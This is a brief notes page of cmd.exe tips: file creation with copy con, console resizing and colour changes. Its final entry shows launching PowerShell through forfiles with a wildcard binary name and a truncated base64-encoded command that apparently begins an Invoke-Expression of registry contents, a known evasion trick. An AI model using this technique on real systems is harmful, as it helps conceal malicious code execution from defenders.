Some cmd.exe commands
=====================

Here is a set of commands which are not very easy to remember but can be useful.

Create a file with input from the console::

    copy con new_file.txt

    # Read it
    type new_file.txt
    # Remove it
    del new_file.txt

Resize the window (from http://superuser.com/questions/653390/how-can-i-open-a-console-application-with-a-given-window-size)::

    mode con:cols=140 lines=70

Change colors::

    # Write white on blue background
    color 1f

    # Write dark or light green on black
    color 2
    color a

Run PowerShell using ``forfiles`` (cf. https://twitter.com/AmnaKMahmood/status/1121504040083496961)::

    # /p to specify the path where to start searching,
    # /s to recurse into subdirectories,
    # /m to specify the search mask,
    # /c to run a command, with @file being the name of the file and @path the full path
    forfiles /s /p C:\WINDOWS\System32 /m p*ll.*e /c "cmd /c @file -ec aQBlAHgAIAAoAGcAcAAgACcA..."
